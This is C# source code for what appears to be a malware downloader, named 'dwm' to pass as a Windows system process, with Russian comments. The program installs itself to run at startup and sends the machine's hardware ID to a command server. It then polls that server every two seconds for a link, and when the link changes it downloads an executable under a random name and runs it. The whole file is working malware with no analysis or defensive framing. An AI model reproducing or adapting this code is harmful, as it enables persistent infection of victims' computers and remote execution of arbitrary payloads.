using System;
using System.ComponentModel;
using System.IO;
using System.Net;
using System.Threading;
using System.Threading.Tasks;

namespace dwm
{
    static class Program
    {
        

        static void Main()
        {
            Task.Run(() => Protect.Check());
			
            string api = "/giveme.php?hwid=" + Helper.GetHWID();
            string put = @"C:\ProgramData\links.txt";
            
            Helper.AutoRun();           

            string fname = Helper.RND() + ".exe"; // получаем имя с расширение файла указанного на сервере

            Helper.RootDirC(); // создаем папку под инсталлы


            try
            {
                while (true)
                {
                    string str;
                    using (StreamReader strr = new StreamReader(HttpWebRequest.Create(MyString.LLink).GetResponse().GetResponseStream()))
                        str = strr.ReadToEnd(); // Считываем линк на сервере

                    string ngb;
                    using (StreamReader stg = new StreamReader(HttpWebRequest.Create(MyString.link + api).GetResponse().GetResponseStream()))
                        ngb = stg.ReadToEnd(); // отправляем инфу о юзере



                    if (System.IO.File.Exists(put)) // если мы нашли текстовик с ссылками, то...
                    {
                        FileStream stream = new FileStream(put, FileMode.Open); // читаем содержимое блокнота
                        StreamReader reader = new StreamReader(stream);
                        string ppr = reader.ReadToEnd();
                        stream.Close();

                        if (ppr == str) // сравниваем содержимое блокнота с содержимым сервера
                        {
                            // совпадает                        
                        }

                        else // не нашли совпадений
                        {

                            File.WriteAllText(put, str); // Записываем содержимое с сервера

                            if (str.Length > 0) // если знаков больше 0, то...
                            {
                                Helper.FDel(); // проверяем наличие скачиваемого файла по имени, при совпадении удаляем              
                                Helper.RootDirC();
                                WebClient wc = new WebClient();
                                Helper.Hcon();
                                string url = str;
                                string save_path = MyString.rootdir;
                                string name = fname;
                                wc.DownloadFile(url, save_path + name);

                                System.Diagnostics.Process.Start(MyString.rootdir + fname);

                            }
                            else
                            {
                                // 0 знаков
                            }
                        }

                    }

                    else // если текстовика нет, то...
                    {
                        File.WriteAllText(put, str); // создаем блокнот и записываем содержимое с сервера
                        if (str.Length > 0)
                        {
                            Helper.FDel();
                            Helper.RootDirC();
                            WebClient wc = new WebClient();
                            Helper.Hcon();
                            string url = str;
                            string save_path = MyString.rootdir;
                            string name = fname;
                            wc.DownloadFile(url, save_path + name);

                            System.Diagnostics.Process.Start(MyString.rootdir + fname);


                        }
                        else
                        {

                        }
                    }
                    Thread.Sleep(2000); // ожидание в 2 секунды
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }

        }
    }
}
